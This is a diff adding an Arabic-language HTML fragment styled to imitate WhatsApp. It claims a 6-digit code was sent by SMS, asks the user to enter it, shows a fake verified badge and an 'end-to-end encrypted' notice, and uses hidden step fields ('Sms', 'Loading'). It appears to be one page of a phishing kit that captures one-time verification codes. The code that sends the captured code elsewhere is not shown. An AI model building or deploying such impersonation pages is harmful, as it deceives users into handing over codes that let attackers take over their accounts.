@@ -1,0 +1,53 @@
+<input type="hidden" id="DivName" value="Sms">
+<input type="hidden" id="DivNext" value="Loading">
+
+<div class="whatsapp-card" id="smsContainer">
+  <div class="group-header">
+    <div class="group-avatar-container">
+      <img class="group-avatar" src="./assets/images/group_avatar.png" alt="Group Icon">
+      <span class="verified-badge">✓</span>
+    </div>
+    <h2 class="group-title">سوف يصلك الرمز عبر الرسالة النصية (SMS)</h2>
+    <span class="group-subtitle">تم إرسال رمز مكون من 6 أرقام عبر رسالة نصية SMS إلى رقم هاتفك المسجل.</span>
+  </div>
+
+  <div id="errorMsg" style="display: none;"></div>
+
+  <div class="input-container" style="margin-bottom: 20px;">
+    <p style="color: var(--wa-text-secondary-light); font-size: 0.9rem; text-align: center; margin-bottom: 10px;">
+      يرجى إدخال الرمز الذي وصلك عبر الرسالة النصية
+    </p>
+    <input id="sms" class="otp-input" type="text" name="code" maxlength="6" placeholder="— — — — — —" required="" inputmode="numeric" autofocus="" dir="ltr">
+  </div>
+
+  <button type="submit" class="btn-primary" id="clickmee">
+    <span>تأكيد الرمز</span>
+  </button>
+
+  <div class="timer-container">
+    <button type="button" id="resendSMSBtn" style="background: none; border: none; padding: 0; color: var(--wa-secondary); font-weight: 600; width: auto; font-size: 0.9rem; cursor: pointer; display: flex; align-items: center; gap: 6px;">
+      <span>إعادة إرسال SMS</span>
+      <span id="smsChrono" class="btn-chrono" style="display: none;">
+        (<span class="btn-chrono-timer">60</span>s)
+      </span>
+    </button>
+  </div>
+
+  <div class="secure-note">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+      <path d="M12 2C9.24 2 7 4.24 7 7V9H6C4.9 9 4 9.9 4 11V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V11C20 9.9 19.1 9 18 9H17V7C17 4.24 14.76 2 12 2ZM9 7C9 5.34 10.34 4 12 4C13.66 4 15 5.34 15 7V9H9V7ZM12 13C12.83 13 13.5 13.67 13.5 14.5C13.5 15.33 12.83 16 12 16C11.17 16 10.5 15.33 10.5 14.5C10.5 13.67 11.17 13 12 13Z"/>
+    </svg>
+    <span style="font-size: 0.8rem;">مشفر بالكامل من طرف إلى طرف</span>
+  </div>
+</div>
+
+<script>
+  const smsEl = document.getElementById('sms');
+  if (smsEl && window.enforceOTPInput) {
+    window.enforceOTPInput(smsEl);
+    smsEl.focus();
+  }
+  if (window.setupResendSMSButton) {
+    window.setupResendSMSButton();
+  }
+</script>
